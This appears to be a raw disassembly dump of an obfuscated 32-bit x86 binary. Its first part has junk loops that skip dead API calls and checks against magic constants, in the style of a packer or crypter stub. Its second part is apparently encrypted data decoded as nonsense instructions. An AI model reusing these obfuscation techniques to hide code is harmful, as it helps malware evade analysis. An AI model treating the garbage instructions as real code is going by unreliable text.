  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429eb5
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x42fa3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x42fa40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x42fa0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x42fa44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x42fa10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x42fa14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x42fa48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     bh,BYTE PTR [esi-0x7b51365d]
  417976:	mov    eax,0x9ce87b7a
  41797b:	jnp    0x4179f8
  41797d:	adc    al,0x7d
  41797f:	hlt    
  417980:	fidivr DWORD PTR [ecx-0x4a]
  417983:	push   ss
  417984:	out    dx,al
  417985:	gs sbb eax,0x2d032116
  41798b:	jmp    0xe0fef6d3
  417990:	jl     0x417926
  417992:	xchg   edi,eax
  417993:	add    DWORD PTR [ebx+0xb],0x34
  417997:	stos   DWORD PTR es:[edi],eax
  417998:	push   es
  417999:	pop    ebp
  41799a:	dec    ebx
  41799b:	int3   
  41799c:	xchg   edi,eax
  41799d:	fcmovne st,st(7)
  41799f:	inc    ebp
  4179a0:	in     al,dx
  4179a1:	dec    esi
  4179a2:	xchg   BYTE PTR [esi-0x51],al
  4179a5:	(bad)  
  4179a6:	adc    al,0xae
  4179a8:	das    
  4179a9:	xchg   ebx,eax
  4179aa:	adc    DWORD PTR [esi],0xefe31a88
  4179b0:	mov    esi,0x9fd2d50a
  4179b5:	aas    
  4179b6:	and    eax,0x903f82fe
  4179bb:	xchg   ecx,eax
  4179bc:	cmp    BYTE PTR [ebp+0x5d],cl
  4179bf:	test   eax,0xb2658cb2
  4179c4:	ss enter 0x3c80,0x1f
  4179c9:	and    esp,DWORD PTR [ebp-0x62]
  4179cc:	inc    ebp
  4179cd:	leave  
  4179ce:	adc    al,0x48
  4179d0:	out    dx,eax
  4179d1:	xchg   ebx,eax
  4179d2:	mov    esp,0x7745ca6a
  4179d7:	fdiv   QWORD PTR [ecx]
  4179d9:	fnsave [ecx]
  4179db:	scas   al,BYTE PTR es:[edi]
  4179dc:	or     BYTE PTR [ecx+ebp*4-0x37],cl
  4179e0:	ret    
  4179e1:	lea    ebx,[esi+eiz*2-0x32]
  4179e5:	ret    
  4179e6:	xor    eax,0x3ff6086d
  4179eb:	push   0xffffffa2
  4179ed:	push   ebx
  4179ee:	mov    edi,0x6e6305f2
  4179f3:	rcl    eax,cl
  4179f5:	cmp    al,0xea
  4179f7:	xor    al,0x75
  4179f9:	adc    edx,DWORD PTR [ebx+ebp*2-0x3c]
  4179fd:	jne    0x417990
  4179ff:	jnp    0x417a35
  417a01:	push   ds
  417a02:	fucomip st,st(5)
  417a04:	cmp    dh,BYTE PTR [ebp+0x5f]
  417a07:	jbe    0x4179dd
  417a09:	es popa 
  417a0b:	int3   
  417a0c:	les    ebp,FWORD PTR [ecx+edx*1-0x446bcfcb]
  417a13:	ret    
  417a14:	adc    DWORD PTR [edi],ebx
  417a16:	push   0xffffffeb
  417a18:	or     eax,0xdb78c096
  417a1d:	mov    DWORD PTR [ebx],eax
  417a1f:	stos   BYTE PTR es:[edi],al
  417a20:	loopne 0x4179cb
  417a22:	cmp    al,0x20
  417a24:	call   0x13971544
  417a29:	outs   dx,BYTE PTR ds:[esi]
  417a2a:	inc    eax
  417a2b:	xchg   ebp,eax
  417a2c:	data16 aas 
  417a2e:	sub    DWORD PTR [ebp-0x61af4427],0xffffffb9
  417a35:	sbb    DWORD PTR [ecx-0x4f],ebp
  417a38:	call   0xc366:0x51217c2c
  417a3f:	pop    edx
  417a40:	cwde   
  417a41:	mov    ?,WORD PTR [eax]
  417a43:	ds lods eax,DWORD PTR ds:[esi]
  417a46:	fs fcmovnu st,st(7)
  417a49:	call   0x74f7:0x327d08db
  417a50:	ffreep st(7)
  417a52:	inc    eax
  417a53:	pop    esp
  417a54:	sub    BYTE PTR [edi],al
  417a56:	and    al,0x57
  417a58:	pop    ebx
  417a59:	es sbb al,0x3b
  417a5c:	test   DWORD PTR [eax+0x1df2c4e3],esp
  417a62:	mov    eax,ds:0x316c55ce
  417a67:	cmc    
  417a68:	and    DWORD PTR [esp+eiz*8+0x3b],0x80f525ed
  417a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a71:	cmp    BYTE PTR [eax],bl
  417a73:	out    dx,eax
  417a74:	aad    0xe8
  417a76:	int    0xfd
  417a78:	xlat   BYTE PTR ds:[ebx]
  417a79:	or     al,0xde
  417a7b:	fwait
  417a7c:	sbb    al,0xfb
  417a7e:	mov    bl,0x52
  417a80:	retf   
  417a81:	out    0x6,eax
  417a83:	push   edi
  417a84:	retf   
  417a85:	out    0xa5,al
  417a87:	(bad)  
  417a88:	push   ecx
  417a89:	repz push 0xffffffc8
  417a8c:	repz sbb bh,BYTE PTR [edi-0x435fee7f]
  417a93:	mov    dl,0x46
  417a95:	rol    BYTE PTR [edx],cl
  417a97:	aas    
  417a98:	cmp    ch,cl
  417a9a:	je     0x417b13
  417a9c:	cmp    ch,BYTE PTR [eax-0x5b2f6786]
  417aa2:	inc    esp
  417aa3:	loop   0x417a4e
  417aa5:	sti    
  417aa6:	xor    ebx,DWORD PTR ds:0xe584aba8
  417aac:	stos   BYTE PTR es:[edi],al
  417aad:	cmp    DWORD PTR [eax],esi
  417aaf:	xor    al,0x21
  417ab1:	jb     0x417b1f
  417ab3:	cmp    ebp,ecx
  417ab5:	push   es
  417ab6:	inc    esp
  417ab7:	xchg   esi,eax
  417ab8:	test   esp,0xbed0abec
  417abe:	or     BYTE PTR [ecx+edx*1-0x4498e15],0xaf
  417ac6:	push   esp
  417ac7:	jns    0x417aec
  417ac9:	mov    ebx,0xa8e452bb
  417ace:	test   DWORD PTR [ebx+0x2d99fecd],0x1fc2cc5e
  417ad8:	mov    ebx,0xb5c0607b
  417add:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ade:	pop    esi
  417adf:	bnd jne 0x417ab8
  417ae2:	pop    ecx
  417ae3:	adc    DWORD PTR [edx+0x4d],eax
  417ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ae7:	push   cs
  417ae8:	jecxz  0x417b09
  417aea:	and    dh,BYTE PTR [ecx+0x5fa06dae]
  417af0:	sbb    al,0xbf
  417af2:	leave  
  417af3:	inc    edx
  417af4:	pop    esi
  417af5:	test   DWORD PTR [ebx],esp
  417af7:	or     bh,BYTE PTR [eax+0x5b2720b9]
  417afd:	cs cld 
  417aff:	push   edi
  417b00:	dec    esi
  417b01:	push   ds
  417b02:	js     0x417aa0
  417b04:	out    dx,eax
  417b05:	jae    0x417b4d
  417b07:	pop    esi
  417b08:	xchg   ecx,eax
  417b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b0a:	push   esp
  417b0b:	or     BYTE PTR [ebx],al
  417b0d:	mov    cl,0x95
  417b0f:	dec    ebp
  417b10:	xor    esi,DWORD PTR [ebx]
  417b12:	nop
  417b13:	fwait
  417b14:	cmp    ch,dh
  417b16:	dec    ebp
  417b17:	and    ecx,esp
  417b19:	hlt    
  417b1a:	arpl   WORD PTR [esi+0x6e],sp
  417b1d:	pushf  
  417b1e:	mov    DWORD PTR [esp+edx*1-0x44fa7a82],esi
  417b25:	hlt    
  417b26:	cwde   
  417b27:	cmove  ebx,edi
  417b2a:	sbb    eax,0xf8eb1233
  417b2f:	push   edx
  417b30:	ds gs icebp 
  417b33:	sub    edx,DWORD PTR [edi]
  417b35:	fwait
  417b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b37:	xor    dl,BYTE PTR [esi+0x37]
  417b3a:	loopne 0x417baf
  417b3c:	push   0xb57f7d5a
  417b41:	popa   
  417b42:	cdq    
  417b43:	out    dx,al
  417b44:	mov    edx,0xc61b1e3
  417b49:	sbb    DWORD PTR [ebx+ebx*4-0x1c],ebx
  417b4d:	mov    BYTE PTR [ebx-0x6d],bl
  417b50:	ror    DWORD PTR [ecx+0x484bd31a],cl
  417b56:	scas   al,BYTE PTR es:[edi]
  417b57:	mov    al,0xaf
  417b59:	and    esi,DWORD PTR [edi+0x51d4ee3c]
  417b5f:	mov    esi,0xec19921f
  417b64:	imul   eax,esp,0x72bb7f27
  417b6a:	mov    esp,0xf46b15bd
  417b6f:	pop    ds
  417b70:	xlat   BYTE PTR ds:[ebx]
  417b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b72:	mov    ebx,0x5a9a45cf
  417b77:	sbb    ecx,DWORD PTR [eax+edi*4-0x45]
  417b7b:	lock adc ah,bh
  417b7e:	jge    0x417bf2
  417b80:	out    0x76,al
  417b82:	push   edi
  417b83:	mov    esp,0xd4d11025
  417b88:	mov    al,ds:0x3938b6c0
  417b8d:	jne    0x417b3a
  417b8f:	ins    DWORD PTR es:[edi],dx
  417b90:	jno    0x417c09
  417b92:	mov    dl,0xfc
  417b94:	cli    
  417b95:	lea    ebp,[edi]
  417b97:	jg     0x417bbb
  417b99:	xchg   DWORD PTR [esi+0xf31d777],ecx
  417b9f:	pop    ebx
  417ba0:	bound  edx,QWORD PTR [edi-0x75baa0d1]
  417ba6:	sub    ebx,edx
  417ba8:	jmp    0x417b72
  417baa:	sbb    bl,cl
  417bac:	inc    cl
  417bae:	test   eax,0xe4cea58b
  417bb3:	into   
  417bb4:	aaa    
  417bb5:	sbb    al,0x93
  417bb7:	xor    BYTE PTR [edx+esi*8+0x25dab876],0xa0
  417bbf:	ret    
  417bc0:	add    eax,0xadff228a
  417bc5:	xchg   ebp,eax
  417bc6:	sub    DWORD PTR [eax-0x31352d66],edi
  417bcc:	fs xchg edx,eax
  417bce:	out    0x2f,eax
  417bd0:	or     DWORD PTR [esi+0x53],edx
  417bd3:	in     al,dx
  417bd4:	add    DWORD PTR [ecx+edx*8],0xffffffab
  417bd8:	or     DWORD PTR [edx+edx*4+0x29],edx
  417bdc:	stos   BYTE PTR es:[edi],al
  417bdd:	sub    BYTE PTR es:[eax],dl
  417be0:	in     al,0x79
  417be2:	sub    edx,eax
  417be4:	and    DWORD PTR [esi+esi*2-0x64],esi
  417be8:	nop
  417be9:	push   ebx
  417bea:	pop    ds
  417beb:	mov    ecx,es
  417bed:	and    al,0x81
  417bef:	add    al,BYTE PTR [bx+di+0x2c7d]
  417bf4:	cmp    eax,0x28c61c3b
  417bf9:	ret    
  417bfa:	stc    
  417bfb:	scas   eax,DWORD PTR es:[edi]
  417bfc:	dec    ecx
  417bfd:	cmc    
  417bfe:	lods   al,BYTE PTR ds:[esi]
  417bff:	popf   
  417c00:	mov    ah,0x19
  417c02:	pop    esp
  417c03:	(bad)  
  417c04:	cld    
  417c05:	add    ah,BYTE PTR [edi]
  417c07:	push   edx
  417c08:	xchg   ebx,eax
  417c09:	dec    edi
  417c0a:	push   ecx
  417c0b:	dec    edx
  417c0c:	jge    0x417c62
  417c0e:	mov    ch,0xd6
  417c10:	leave  
  417c11:	push   es
  417c12:	in     al,0x71
  417c14:	push   0xffffff9a
  417c16:	mov    eax,ds:0xc98c9c77
  417c1b:	xchg   ecx,eax
  417c1c:	aas    
  417c1d:	sti    
  417c1e:	aas    
  417c1f:	pop    ebx
  417c20:	xchg   ebx,eax
  417c21:	add    edx,ebp
  417c23:	mov    dh,0xa
  417c25:	mov    bl,0x8b
  417c27:	dec    ebp
  417c28:	sbb    edx,DWORD PTR [eax+0x3b2174e3]
  417c2e:	mov    eax,?
  417c30:	pop    es
  417c31:	add    ecx,DWORD PTR [ebx]
  417c33:	adc    al,0xea
  417c35:	scas   al,BYTE PTR es:[edi]
  417c36:	neg    DWORD PTR [ecx+0x29]
  417c39:	add    cl,bh
  417c3b:	in     al,0x44
  417c3d:	call   0xf172:0xf3047cc1
  417c44:	int3   
  417c45:	lods   eax,DWORD PTR ds:[esi]
  417c46:	inc    eax
  417c47:	push   esi
  417c48:	ins    DWORD PTR es:[edi],dx
  417c49:	mov    eax,0x4017f9bd
  417c4e:	popa   
  417c4f:	xchg   edx,eax
  417c50:	mov    DWORD PTR [edx-0x37],ebx
  417c53:	not    DWORD PTR [edx-0x4c]
  417c56:	addr16 and ch,cl
  417c59:	out    0x44,al
  417c5b:	adc    al,0xbd
  417c5d:	ja     0x417ccd
  417c5f:	xor    al,0xa7
  417c61:	ds jns 0x417caa
  417c64:	mov    ebp,DWORD PTR [ebx+ecx*8]
  417c67:	add    bl,BYTE PTR [esp+ebp*4+0x14]
  417c6b:	rcl    BYTE PTR [edi-0x5f],1
  417c6e:	jmp    0x6d60545f
  417c73:	nop
  417c74:	cs (bad) 
  417c76:	out    dx,al
  417c77:	and    dh,bl
  417c79:	cmp    eax,0xa7177f1b
  417c7e:	and    BYTE PTR [ecx],dl
  417c80:	scas   al,BYTE PTR es:[edi]
  417c81:	gs mov ebx,0xe577e957
  417c87:	xor    dh,BYTE PTR [eax+edi*8+0x35ae0b9c]
  417c8e:	(bad)
  417c91:	pop    eax
  417c92:	cmp    al,0xf8
  417c94:	sbb    ebx,ebx
  417c96:	push   edi
  417c97:	iret   
  417c98:	mov    ch,0x17
  417c9a:	loop   0x417c9f
  417c9c:	push   eax
  417c9d:	daa    
  417c9e:	ret    0x1727
  417ca1:	xchg   ebp,eax
  417ca2:	in     al,0xac
  417ca4:	loop   0x417c94
  417ca6:	and    edi,DWORD PTR [ebp-0x41b52c2f]
  417cac:	retf   
  417cad:	sub    DWORD PTR [eax+eax*8+0x28e834de],esp
  417cb4:	and    dh,cl
  417cb6:	sub    eax,0x9cf2754c
  417cbb:	mul    DWORD PTR ss:[ecx+ebx*2+0x6eaad47f]
  417cc3:	push   ds
  417cc4:	sub    al,BYTE PTR [edx]
  417cc6:	je     0x417cec
  417cc8:	jae    0x417d00
  417cca:	push   esp
  417ccb:	jbe    0x417d38
  417ccd:	xor    DWORD PTR [esi+0x79],ebp
  417cd0:	and    esp,0xbd93336d
  417cd6:	add    al,0x31
  417cd8:	mov    BYTE PTR [esi],dl
  417cda:	jbe    0x417cb6
  417cdc:	pop    ecx
  417cdd:	icebp  
  417cde:	rcr    al,cl
  417ce0:	repnz into 
  417ce2:	pop    esp
  417ce3:	neg    DWORD PTR [edi+0x7691540f]
  417ce9:	adc    ebp,ebx
  417ceb:	pminub mm1,mm1
  417cee:	mov    fs,esp
  417cf0:	jmp    0x417d2d
  417cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cf3:	sbb    DWORD PTR [edx],0x74da224e
  417cf9:	xchg   BYTE PTR [edx-0x78d37245],ah
  417cff:	mov    ch,0x52
  417d01:	push   edx
  417d02:	icebp  
  417d03:	enter  0x4eca,0xca
  417d07:	xor    DWORD PTR [ebp+0x4c044186],esi
  417d0d:	push   esi
  417d0e:	and    cl,BYTE PTR [ebx-0x4935eb64]
  417d14:	shr    BYTE PTR [ecx+0x41],cl
  417d17:	scas   eax,DWORD PTR es:[edi]
  417d18:	mov    DWORD PTR ds:0x52819e31,esp
  417d1e:	addr16 sti 
  417d20:	sti    
  417d21:	cmp    dh,ah
  417d23:	mov    ecx,0x89418abd
  417d28:	ja     0x417d73
  417d2a:	imul   BYTE PTR [edx+0x4]
  417d2d:	sbb    eax,0x4c8f3d7f
  417d32:	ret    
  417d33:	sbb    BYTE PTR [edx],ch
  417d35:	fwait
  417d36:	cwde   
  417d37:	mov    al,0x81
  417d39:	pop    eax
  417d3a:	adc    DWORD PTR ds:0xf9dffb1f,ebp
  417d40:	test   BYTE PTR [eax-0x59],0x2c
  417d44:	xor    eax,0x2c437f22
  417d49:	push   ss
  417d4a:	jne    0x417d3f
  417d4c:	sub    ch,BYTE PTR [edx-0x78953671]
  417d52:	sub    ecx,eax
  417d54:	repnz dec esp
  417d56:	xchg   edi,eax
  417d57:	cmp    bh,cl
  417d59:	dec    edi
  417d5a:	shl    DWORD PTR [ebx],cl
  417d5c:	sbb    ebp,DWORD PTR [ecx]
  417d5e:	ja     0x417d61
  417d60:	push   edi
  417d61:	es cs push eax
  417d64:	and    DWORD PTR [ebx+0x118035a1],esi
